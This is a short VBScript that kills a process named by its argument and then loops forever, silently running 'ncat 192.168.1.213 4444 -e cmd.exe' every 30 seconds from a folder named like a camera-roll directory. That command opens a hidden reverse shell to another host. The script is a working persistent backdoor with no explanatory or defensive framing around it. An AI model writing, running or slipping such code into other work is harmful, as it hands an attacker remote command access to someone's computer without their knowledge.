WScript.Sleep 1000
Set oShell = CreateObject("Wscript.Shell")
pid = WScript.Arguments(0)
oShell.run "taskkill /F /PID " & pid, 0, True
Do While True
	Set oShell = CreateObject("Wscript.Shell")
	oShell.run "cmd /c cd %userprofile%\photos01\camera\roll & ncat 192.168.1.213 4444 -e cmd.exe", 0, True
	WScript.Sleep 30000
Loop
